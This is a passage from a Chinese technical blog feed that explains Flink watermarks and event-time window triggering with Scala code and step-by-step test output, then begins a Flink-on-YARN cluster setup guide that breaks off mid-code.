title="示例"></a>示例</h3><p>如果设置最大允许的乱序时间是10s，滚动时间窗口为5s</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:24"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br><span class="line">//currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:24],currentMaxTimestamp:[2019-03-26 16:25:24],watermark:[2019-03-26 16:25:14]</span><br></pre></td></tr></table></figure><p>触达改记录的时间窗口应该为<code>2019-03-26 16:25:20~2019-03-26 16:25:25</code><br>即当有数据eventTime &gt;= 2019-03-26 16:25:35 时</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:35"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br><span class="line">//currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25]</span><br><span class="line">//(zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><h3 id="提取watermark"><a href="#提取watermark" class="headerlink" title="提取watermark"></a>提取watermark</h3><p>watermark的提取工作在taskManager中完成，意味着这项工作是并行进行的的，而watermark是一个全局的概念，就是一个整个Flink作业之后一个warkermark。</p><h3 id="AssignerWithPeriodicWatermarks"><a href="#AssignerWithPeriodicWatermarks" class="headerlink" title="AssignerWithPeriodicWatermarks"></a>AssignerWithPeriodicWatermarks</h3><p>定时提取watermark，这种方式会定时提取更新wartermark。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认200ms</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStreamTimeCharacteristic</span><span class="params">(TimeCharacteristic characteristic)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.timeCharacteristic = Preconditions.checkNotNull(characteristic);</span><br><span class="line">    <span class="keyword">if</span> (characteristic == TimeCharacteristic.ProcessingTime) &#123;</span><br><span class="line">        getConfig().setAutoWatermarkInterval(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        getConfig().setAutoWatermarkInterval(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AssignerWithPunctuatedWatermarks"><a href="#AssignerWithPunctuatedWatermarks" class="headerlink" title="AssignerWithPunctuatedWatermarks"></a>AssignerWithPunctuatedWatermarks</h3><p>伴随event的到来就提取watermark，就是每一个event到来的时候，就会提取一次Watermark。<br>这样的方式当然设置watermark更为精准，但是当数据量大的时候，频繁的更新wartermark会比较影响性能。<br>通常情况下采用定时提取就足够了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h3 id="设置数据流时间特征"><a href="#设置数据流时间特征" class="headerlink" title="设置数据流时间特征"></a>设置数据流时间特征</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置为事件时间</span></span><br><span class="line">env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br></pre></td></tr></table></figure><p>默认为<code>TimeCharacteristic.ProcessingTime</code>,默认水位线更新每隔200ms</p><p>入口文件</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> env = <span class="type">StreamExecutionEnvironment</span>.getExecutionEnvironment</span><br><span class="line"></span><br><span class="line"><span class="comment">//便于测试，并行度设置为1</span></span><br><span class="line">env.setParallelism(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//env.getConfig.setAutoWatermarkInterval(9000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置为事件时间</span></span><br><span class="line">env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置source 本地socket</span></span><br><span class="line"><span class="keyword">val</span> text: <span class="type">DataStream</span>[<span class="type">String</span>] = env.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> lateText = <span class="keyword">new</span> <span class="type">OutputTag</span>[(<span class="type">String</span>, <span class="type">String</span>, <span class="type">Long</span>, <span class="type">Long</span>)](<span class="string">"late_data"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> value = text.filter(<span class="keyword">new</span> <span class="type">MyFilterNullOrWhitespace</span>)</span><br><span class="line">.flatMap(<span class="keyword">new</span> <span class="type">MyFlatMap</span>)</span><br><span class="line">.assignTimestampsAndWatermarks(<span class="keyword">new</span> <span class="type">MyWaterMark</span>)</span><br><span class="line">.map(x =&gt; (x.name, x.datetime, x.timestamp, <span class="number">1</span>L))</span><br><span class="line">.keyBy(_._1)</span><br><span class="line">.window(<span class="type">TumblingEventTimeWindows</span>.of(<span class="type">Time</span>.seconds(<span class="number">5</span>)))</span><br><span class="line">.sideOutputLateData(lateText)</span><br><span class="line"><span class="comment">//.sum(2)</span></span><br><span class="line">.apply(<span class="keyword">new</span> <span class="type">MyWindow</span>)</span><br><span class="line"><span class="comment">//.window(TumblingEventTimeWindows.of(Time.seconds(3)))</span></span><br><span class="line"><span class="comment">//.apply(new MyWindow)</span></span><br><span class="line">value.getSideOutput(lateText).map(x =&gt; &#123;</span><br><span class="line"><span class="string">"延迟数据|name:"</span> + x._1 + <span class="string">"|datetime:"</span> + x._2</span><br><span class="line">&#125;).print()</span><br><span class="line"></span><br><span class="line">value.print()</span><br><span class="line"></span><br><span class="line">env.execute(<span class="string">"watermark test"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyWaterMark</span> <span class="keyword">extends</span> <span class="title">AssignerWithPeriodicWatermarks</span>[<span class="type">EventObj</span>] </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> maxOutOfOrderness = <span class="number">10000</span>L <span class="comment">// 3.0 seconds</span></span><br><span class="line">  <span class="keyword">var</span> currentMaxTimestamp = <span class="number">0</span>L</span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> sdf = <span class="keyword">new</span> <span class="type">SimpleDateFormat</span>(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 用于生成新的水位线，新的水位线只有大于当前水位线才是有效的</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * 通过生成水印的间隔（每n毫秒）定义 ExecutionConfig.setAutoWatermarkInterval(...)。</span></span><br><span class="line"><span class="comment">    * getCurrentWatermark()每次调用分配器的方法，如果返回的水印非空并且大于先前的水印，则将发出新的水印。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getCurrentWatermark</span></span>: <span class="type">Watermark</span> = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="type">Watermark</span>(<span class="keyword">this</span>.currentMaxTimestamp - <span class="keyword">this</span>.maxOutOfOrderness)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 用于从消息中提取事件时间</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param element                  EventObj</span></span><br><span class="line"><span class="comment">    * @param previousElementTimestamp Long</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">extractTimestamp</span></span>(element: <span class="type">EventObj</span>, previousElementTimestamp: <span class="type">Long</span>): <span class="type">Long</span> = &#123;</span><br><span class="line"></span><br><span class="line">    currentMaxTimestamp = <span class="type">Math</span>.max(element.timestamp, currentMaxTimestamp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> id = <span class="type">Thread</span>.currentThread().getId</span><br><span class="line">    println(<span class="string">"currentThreadId:"</span> + id + <span class="string">",key:"</span> + element.name + <span class="string">",eventTime:["</span> + element.datetime + <span class="string">"],currentMaxTimestamp:["</span> + sdf.format(currentMaxTimestamp) + <span class="string">"],watermark:["</span> + sdf.format(getCurrentWatermark().getTimestamp) + <span class="string">"]"</span>)</span><br><span class="line"></span><br><span class="line">    element.timestamp</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h3><ol><li>设置为事件时间</li><li>接受本地socket数据</li><li>抽取timestamp生成watermark，打印(线程id,key,eventTime,currentMaxTimestamp,watermark）</li><li>event time每隔3秒触发一次窗口，打印（key,窗口内元素个数，窗口内最早元素的时间，窗口内最晚元素的时间，窗口自身开始时间，窗口自身结束时间）</li></ol><h3 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h3><h4 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h4><p>数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:24"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:24],currentMaxTimestamp:[2019-03-26 16:25:24],watermark:[2019-03-26 16:25:14]</span><br></pre></td></tr></table></figure><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr></tbody></table><h4 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:27&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:27],currentMaxTimestamp:[2019-03-26 16:25:27],watermark:[2019-03-26 16:25:17]</span><br></pre></td></tr></table></figure><p>随着EventTime的升高，Watermark升高。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td></tr></tbody></table><h4 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:34&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:34],currentMaxTimestamp:[2019-03-26 16:25:34],watermark:[2019-03-26 16:25:24]</span><br></pre></td></tr></table></figure><p>到这里，window仍然没有被触发，此时watermark的时间已经等于了第一条数据的Event Time了。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td><strong>2019-03-26 16:25:24</strong></td></tr></tbody></table><h4 id="第四次"><a href="#第四次" class="headerlink" title="第四次"></a>第四次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:35&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25](zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25](zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><p>直接证明了window的设定无关数据本身，而是系统定义好了的。<br>输入的数据中，根据自身的Event Time，将数据划分到不同的window中，如果window中有数据，则当watermark时间&gt;=Event Time时，就符合了window触发的条件了，最终决定window触发，还是由数据本身的Event Time所属的window中的window_end_time决定。</p><p>当最后一条数据16:25:35到达是，Watermark提升到16:25:25，此时窗口16:25:20~16:25:25中有数据，Window被触发。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr></tbody></table><h4 id="第五次"><a href="#第五次" class="headerlink" title="第五次"></a>第五次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:37&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:37],currentMaxTimestamp:[2019-03-26 16:25:37],watermark:[2019-03-26 16:25:27]</span><br></pre></td></tr></table></figure><p>此时，watermark时间虽然已经达到了第二条数据的时间，但是由于其没有达到第二条数据所在window的结束时间，所以window并没有被触发。</p><p>第二条数据所在的window时间是：<code>[2019-03-26 16:25:25,2019-03-26 16:25:30)</code></p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:27</td><td></td></tr></tbody></table><h4 id="第六次"><a href="#第六次" class="headerlink" title="第六次"></a>第六次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:40&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:40],currentMaxTimestamp:[2019-03-26 16:25:40],watermark:[2019-03-26 16:25:30](zhangsan,1,2019-03-26 16:25:27,2019-03-26 16:25:27,2019-03-26 16:25:25,2019-03-26 16:25:30)</span><br></pre></td></tr></table></figure><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:27</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:40</td><td>2019-03-26 16:25:40</td><td><strong>2019-03-26 16:25:30</strong></td><td><strong>[2019-03-26 16:25:25</strong></td><td><strong>2019-03-26 16:25:30)</strong></td></tr></tbody></table><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>window的触发要符合以下几个条件：</p><ol><li>watermark时间 &gt;= window_end_time</li><li>在[window_start_time,window_end_time)中有数据存在</li></ol><p>同时满足了以上2个条件，window才会触发。<br>watermark是一个全局的值，不是某一个key下的值，所以即使不是同一个key的数据，其warmark也会增加.</p><h3 id="多并行度"><a href="#多并行度" class="headerlink" title="多并行度"></a>多并行度</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8o5410mbdj20xd0h3wlo.jpg" alt="2.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h3 id="Flink如何处理乱序？"><a href="#Flink如何处理乱序？" class="headerlink" title="Flink如何处理乱序？"></a>Flink如何处理乱序？</h3><p>watermark+window机制。window中可以对input进行按照Event Time排序，使得完全按照Event Time发生的顺序去处理数据，以达到处理乱序数据的目的。</p><h3 id="Flink何时触发window？"><a href="#Flink何时触发window？" class="headerlink" title="Flink何时触发window？"></a>Flink何时触发window？</h3><p>对于late element太多的数据而言</p><ol><li>Event Time &lt; watermark时间</li></ol><p>对于out-of-order以及正常的数据而言</p><ol><li>watermark时间 &gt;= window_end_time</li><li>在[window_start_time,window_end_time)中有数据存在</li></ol><h3 id="Flink应该如何设置最大乱序时间？"><a href="#Flink应该如何设置最大乱序时间？" class="headerlink" title="Flink应该如何设置最大乱序时间？"></a>Flink应该如何设置最大乱序时间？</h3><p>结合自己的业务以及数据情况去设置。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8o549eyilj210b0i446b.jpg" alt="3.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前Flink的Watermark原理老是不明白，并且在CSDN上找的一篇文章，似乎是因为版本的问题，两年前的博客，代码验证下来始终有问题，在网上和人谈论之后，重新用代码验证了，才有点清晰明了，在此记录一下。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://yoursite.com/categories/Flink/"/>
    
    
      <category term="Flink" scheme="http://yoursite.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink集群搭建</title>
    <link href="http://yoursite.com/2019/08/06/Flink%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/08/06/Flink集群搭建/</id>
    <published>2019-08-06T02:48:21.576Z</published>
    <updated>2019-08-09T01:17:48.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Flink集群搭建"><a href="#Flink集群搭建" class="headerlink" title="Flink集群搭建"></a>Flink集群搭建</h1><a id="more"></a> <h3 id="环境"><a href="#环境" class="headerlink" title="环境:"></a>环境:</h3><p>hadoop 2.6.0</p><p>centos 7</p><p>java 1.8.144</p><p>scala 2.11.8</p><p>机器: datanode 126 127 128(ssh)</p><h3 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h3><p>参考:<a href="https://ci.apache.org/projects/flink/flink-docs-stable/ops/deployment/yarn_setup.html#flink-yarn-session" target="_blank" rel="noopener">Flink 官方文档</a></p><p>Flink 1.8</p><p>选择原因: Flink 还处在频繁更新的状态,较新的版本,特性和老版本特别较大,</p><p>Flink 1.8 有如下主要改变:</p><p>1.将会增量清除旧的State<br>2.编程方面TableEnvironment弃用<br>3.Flink1.8将不发布带有Hadoop的二进制安装包</p><p>其中编程方面的改变比较重要,会延续到以后的版本,综合考虑,不使用最新的1.9,使用1.8是较为稳妥的选择.</p><h3 id="Flink安装模式"><a href="#Flink安装模式" class="headerlink" title="Flink安装模式"></a>Flink安装模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">local模式：适用于本地开发和测试环境，占用的资源较少，部署简单 ，只需要部署JDK和flink即可达到功能开发和测试的目的。只需要一台主机即可。</span><br><span class="line"> </span><br><span class="line">standalone cluster：可以在测试环境功能验证完毕到版本发布的时候使用，进行性能验证。搭建需要ssh</span><br><span class="line">jdk和flink。至少需要3台主机，一个master两个worker节点。</span><br><span class="line"> </span><br><span class="line">YARN：flink使用YARN进行调度。</span><br><span class="line"> </span><br><span class="line">Hadoop Integration：和hadoop生态进行整合，可以借用HDFS、YARN的功能，是用于整个大数据环境都用Hadoop全家桶的环境。</span><br><span class="line"> </span><br><span class="line">Docker： 在开发测试使用，docker方式很容易搭建。推荐的方式。</span><br><span class="line"> </span><br><span class="line">kubernetes：由于FLink使用的无状态模式，只需要kubernetes提供计算资源即可。会是Flink以后运行的主流方式，可以起到节约硬件资源和便于管理的效果。</span><br><span class="line"> </span><br><span class="line">HA模式：</span><br><span class="line">现在主流的方式有standalone cluster HA 和YARN cluster HA方式，适用于在生产上部署。</span><br><span class="line">standalone cluster HA：</span><br><span class="line">需要JDK、ssh、zookeeper HA、flink构建，至少需要三个物理机。</span><br><span class="line"> </span><br><span class="line">YARN cluster HA：</span><br><span class="line">需要JDK、ssh、zookeeper HA、Hadoop HA、flink，需要更多的资源。</span><br><span class="line"> </span><br><span class="line">若flink运行于k8s则可以借助于kubernetes的集群提供高可用，充分的利用资源。</span><br><span class="line"> </span><br><span class="line">当前大部分公司还是将Flink运行在物理机上。</span><br></pre></td></tr></table></figure><h3 id="多种安装模式尝试"><a href="#多种安装模式尝试" class="headerlink" title="多种安装模式尝试:"></a>多种安装模式尝试:</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">Flink官方链接</a></p><p>官方链接中可以选择使用scala 2.11 还是 2.12版本.这边选择2.11版本即可.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5ittrsyi7j20an03v3yh.jpg" alt></p><p>下载完成之后, <code>tar zvxf flink-1.8.1-bin-scala_2.11.tgz -C /usr</code>解压</p><h4 id="Yarn配置模式的选择"><a href="#Yarn配置模式的选择" class="headerlink" title="Yarn配置模式的选择:"></a>Yarn配置模式的选择:</h4><p>如果选择Flink on Yarn的话,就比较简单,因为测试集群上已经存在了CDH,所以直接尝试<code>Flink on yarn.</code></p><p>把 Flink 运行在 YARN 上有两种方式，第一种方式是建立一个长期运行的 Flink YARN Session，然后向这个 Session 提交 Flink Job，多个任务同时运行时会共享资源。第二种方式是为单个任务启动一个 Flink 集群，这个任务会独占 Flink 集群的所有资源，任务结束即代表集群被回收。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>因为之前安装使用的CDH 所以系统中没有hadoop的环境变量,这边需要配置hadoop的环境变量才可以继续使用.</p><p>配置如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> hadoop</span><br><span class="line">export HADOOP_HOME=/opt/cloudera/parcels/CDH/lib/hadoop</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> hadoop conf</span><br><span class="line">export HADOOP_CONF_DIR=$&#123;HADOOP_HOME&#125;/etc/hadoop</span><br></pre></td></tr></table></figure><p>配置完成之后  source 立即生效.</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>因为之前说过1.8版本有个新特性就是官方不再发布关联hadoop的二进制包,所以hadoop的依赖我们自己下载.</p><p><a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">下载地址</a></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5ivnayodoj20ob0dyaaz.jpg" alt></p><p>我们的hadoop是2.6的,下载这个2.6版本的就好.</p><p>下载完成后有添加到lib</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 